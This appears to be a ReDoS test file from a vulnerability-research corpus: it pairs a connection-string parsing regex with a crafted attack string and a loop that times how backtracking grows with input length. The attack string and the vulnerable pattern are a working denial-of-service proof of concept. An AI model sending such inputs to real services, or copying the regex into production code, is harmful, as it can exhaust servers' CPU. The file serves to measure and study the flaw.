/* 3422
 * (?:Provider="??(?<Provider>[^;\n]+)"??[;\n"]??|Data\sSource=(?<DataSource>[^;\n]+)[;\n"]??|Initial\sCatalog=(?<InitialCatalog>[^;\n]+)[;\n"]??|User\sID=(?<UserID>[^;\n]+)[;\n"]??|Password="??(?<Password>[^;\n]+)"??[;\n"]??|Integrated\sSecurity=(?<IntegratedSecurity>[^;\n]+)[;\n]??|Connection\sTimeOut=(?<ConnectionTimeOut>[^;\n]+)[;\n"]??)+$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"Provider=" ";"*16+"! _1SLQ_1"
 */
var REGEX = /(?:Provider="??(?<Provider>[^;\n]+)"??[;\n"]??|Data\sSource=(?<DataSource>[^;\n]+)[;\n"]??|Initial\sCatalog=(?<InitialCatalog>[^;\n]+)[;\n"]??|User\sID=(?<UserID>[^;\n]+)[;\n"]??|Password="??(?<Password>[^;\n]+)"??[;\n"]??|Integrated\sSecurity=(?<IntegratedSecurity>[^;\n]+)[;\n]??|Connection\sTimeOut=(?<ConnectionTimeOut>[^;\n]+)[;\n"]??)+$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + 'Provider=\" \";'.repeat(i*1) + '! _1SLQ_1'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}